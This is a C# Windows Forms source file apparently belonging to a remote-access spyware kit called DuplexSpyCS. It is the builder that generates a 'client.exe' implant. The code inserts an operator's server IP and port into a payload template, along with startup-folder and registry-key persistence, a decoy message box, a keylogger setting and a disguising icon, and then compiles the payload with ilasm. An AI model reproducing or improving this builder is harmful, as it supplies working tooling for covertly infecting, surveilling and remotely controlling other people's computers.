using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Diagnostics;

namespace DuplexSpyCS
{
    public partial class frmBuild : Form
    {
        private IniManager ini_manager = C2.ini_manager;
        private Image exe_icon;

        private BuildConfig buildConfig;
        private MsgBoxConfig msgboxConfig;

        public frmBuild()
        {
            InitializeComponent();
        }

        /// <summary>
        /// Append "information" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsInfo(string msg)
        {
            richTextBox1.SelectionColor = Color.Blue;
            richTextBox1.AppendText("[*] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Append "OK" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsOK(string msg)
        {
            richTextBox1.SelectionColor = Color.Lime;
            richTextBox1.AppendText("[+] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Append "Error" log.
        /// </summary>
        /// <param name="msg"></param>
        void logsErr(string msg)
        {
            richTextBox1.SelectionColor = Color.LightCoral;
            richTextBox1.AppendText("[-] ");
            richTextBox1.SelectionColor = Color.White;
            richTextBox1.AppendText(msg);
            richTextBox1.AppendText(Environment.NewLine);
        }

        /// <summary>
        /// Validate build configuration.
        /// </summary>
        /// <param name="config"></param>
        /// <returns></returns>
        bool ValidateBuildConfig(BuildConfig config)
        {
            try
            {
                if (string.IsNullOrEmpty(config.szIP))
                    throw new Exception("Server IP is null or empty.");
                else
                    IPAddress.Parse(config.szIP); //throw exception if parse failed.

                if (config.dwPort <= 1024 || config.dwPort >= 65536)
                    throw new Exception("Invalid port value.");

                if (config.dwTimeout < 0)
                    throw new Exception("Invalid timeout value.");

                if (config.dwRetry < 0)
                    throw new Exception("Invalid retry value.");

                return true;
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "BuildConfig structure data error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                logsErr(ex.Message);

                return false;
            }
        }

        /// <summary>
        /// Compile client exe from il assembly.
        /// </summary>
        /// <param name="output_file">Output exe file.</param>
        /// <param name="srcContent">IL assembly code.</param>
        /// <returns></returns>
        bool CompileFromIL(string output_file, string srcContent)
        {
            /* How it work:
             * Write srcContent(Payload) into temp file,
             * compile the il assembly code using ilasm: ilasm tmp.il /debug /output:output_file.
             * Delete temp file.
             * Change output exe file icon(If specified).
             */

            //TODO
            try
            {
                string ilasm_file = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Tools",
                    "ilasm.exe",
                });

                string tmp_file = Path.Combine(new string[]
                {
                    Application.StartupPath,
                    "Payload",
                    "Merged",
                    Path.GetRandomFileName(),
                });

                File.WriteAllText(tmp_file, srcContent);

                Process proc = new Process();
                proc.StartInfo = new ProcessStartInfo()
                {
                    FileName = ilasm_file,
                    Arguments = $"\"{tmp_file}\" /debug /out:\"{output_file}\"",
                    UseShellExecute = false,
                    CreateNoWindow = true,
                };
                proc.Start();

                proc.WaitForExit();

                File.Delete(tmp_file);

                return File.Exists(output_file);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);

                return false;
            }
        }

        /// <summary>
        /// Build client exe file.
        /// </summary>
        /// <param name="filePath"></param>
        void Build(string filePath)
        {
            tabControl1.SelectedIndex = tabControl1.TabPages.Count - 1; //Select Last Page

            buildConfig = new BuildConfig()
            {
                /* Necessary Data */
                szIP = textBox1.Text, //Server IP address
                dwPort = (int)numericUpDown1.Value, //Server listening port.
                dwTimeout = (int)numericUpDown2.Value, //Client connection timeout(ms).
                dwRetry = (int)numericUpDown3.Value, //Client reconnect time interval(ms).
                dwInterval = (int)numericUpDown4.Value, //Send inform interval(ms).

                //Install
                bCopyDir = checkBox1.Checked,
                szCopyDir = comboBox1.Text,
                bCopyStartUp = checkBox2.Checked,
                szStartUpName = textBox3.Text,
                bRegistry = checkBox3.Checked,
                szRegKeyName = textBox4.Text,

                //Misc
                msgboxConfig = this.msgboxConfig, //Message box configuration.
            };

            //Validate configuration, stop build client exe file if validation is failed.
            if (!ValidateBuildConfig(buildConfig))
                return;

            buildConfig.clntType = ClientType.Merged;

            //Client source file path.
            string szIL = Path.Combine(
                new string[]
                {
                    Application.StartupPath,
                    "Payload",
                    buildConfig.clntType.ToString(),
                    $"{buildConfig.clntType}.il",
                }
            );

            if (File.Exists(szIL))
            {
                string szPayload = File.ReadAllText(szIL);
                if (string.IsNullOrEmpty(szPayload))
                {
                    MessageBox.Show("File content is null or empty:\n" + szIL, "IsNullOrEmpty()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                //Set value
                szPayload = (szPayload

                    //General
                    .Replace("[IP]", buildConfig.szIP)
                    .Replace("[PORT]", buildConfig.dwPort.ToString())
                    .Replace("[INTERVAL]", buildConfig.dwInterval.ToString())
                    .Replace("[TIMEOUT]", buildConfig.dwTimeout.ToString()) //ms
                    .Replace("[RETRY]", buildConfig.dwRetry.ToString()) //ms

                    //Install
                    .Replace("[IS_CP_DIR]", buildConfig.bCopyDir ? "true" : "false")
                    .Replace("[IS_SZ_DIR]", buildConfig.szCopyDir)
                    .Replace("[IS_CP_STARTUP]", buildConfig.bCopyStartUp ? "true" : "false")
                    .Replace("[IS_SZ_STARTUP]", buildConfig.szStartUpName)
                    .Replace("[IS_REG]", buildConfig.bRegistry ? "true" : "false")
                    .Replace("[IS_REG_KEY]", buildConfig.szRegKeyName)

                    //Misc
                    .Replace("[MB_ENABLE]", buildConfig.bMsgBox ? "true" : "false")
                    .Replace("[MB_CAPTION]", buildConfig.msgboxConfig.caption)
                    .Replace("[MB_TEXT]", buildConfig.msgboxConfig.context)
                    .Replace("[MB_BTN]", buildConfig.msgboxConfig.button.ToString())
                    .Replace("[MB_ICON]", buildConfig.msgboxConfig.icon.ToString())

                    //Other
                    .Replace("-nan(ind)", "0x7FF8000000000000")
                );

                if (CompileFromIL(filePath, szPayload))
                {


                    //Compile successfully.
                    MessageBox.Show("Build client successfully:\n" + filePath, "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    logsOK("Build client successfully: " + filePath);
                }
                else
                {
                    //Compile failed.
                    MessageBox.Show("Build client failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    logsErr("Build client failed.");
                }
            }
            else
            {
                MessageBox.Show("File not found:\n" + szIL, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        /// <summary>
        /// Test server listen port.
        /// </summary>
        /// <param name="ip"></param>
        /// <param name="port"></param>
        void ConnTest(string ip, int port)
        {
            try
            {
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.SendTimeout = (int)numericUpDown2.Value;
                socket.Connect(ip, port);
                socket.Close();
                MessageBox.Show("Connect successfully", "OK", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        void setup()
        {
            try
            {
                if (ini_manager == null)
                {
                    MessageBox.Show("ini_manager is null.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    Close();
                    return;
                }
                else
                {
                    string ReadIni(string section, string key)
                    {
                        return ini_manager.Read(section, key);
                    }

                    //General
                    string szIP = "127.0.0.1"; //Server IP address.
                    int dwPort = int.Parse(ReadIni("General", "listen_port")); //Server listening port.

                    int dwTimeout = int.Parse(ReadIni("Build", "timeout")); //ms
                    int dwRetry = int.Parse(ReadIni("Build", "retry")); //ms

                    textBox1.Text = szIP; //Server IP address.
                    numericUpDown1.Value = dwPort; //Server listening port.

                    numericUpDown2.Value = dwTimeout; //Client connection timeout(ms).
                    numericUpDown3.Value = dwRetry;  //Client retry interval(ms).

                    //Install
                    checkBox1.Checked = ReadIni("Build", "bDirectory") == "1";
                    comboBox1.SelectedIndex = 0;
                    checkBox2.Checked = ReadIni("Build", "bStartUp") == "1";
                    textBox3.Text = ReadIni("Build", "szStartUpName");
                    checkBox3.Checked = ReadIni("Build", "bRegistry") == "1";
                    textBox4.Text = ReadIni("Build", "szRegKeyName");

                    //Misc
                    textBox5.Text = ReadIni("Keylogger", "file");
                    checkBox4.Checked = ReadIni("Build", "use_msg_box") == "1";
                    checkBox5.Checked = ReadIni("Build", "use_icon") == "1";
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Close();
            }
        }

        private void frmBuild_Load(object sender, EventArgs e)
        {
            setup();
        }

        //Test Connection
        private void button1_Click(object sender, EventArgs e)
        {
            new Thread(() => ConnTest(textBox1.Text, (int)numericUpDown1.Value)).Start();
        }

        //Build
        private void button3_Click(object sender, EventArgs e)
        {
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = "client.exe";
            sfd.Filter = "Executable File(*.exe)|*.exe";
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    Build(sfd.FileName);
                }
                catch (Exception ex)
                {
                    logsErr(ex.Message);
                }
            }
        }

        //Help
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            new frmBoxHelper("Build\\Help").Show();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            frmBuildMsgbox f = new frmBuildMsgbox();
            f.Text = "Msgbox config";

            f.ShowDialog();

            msgboxConfig = f.config;
        }

        private void button4_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();

            if (ofd.ShowDialog() == DialogResult.OK)
            {
                pictureBox1.Image = Image.FromFile(ofd.FileName);
            }
        }
    }
}
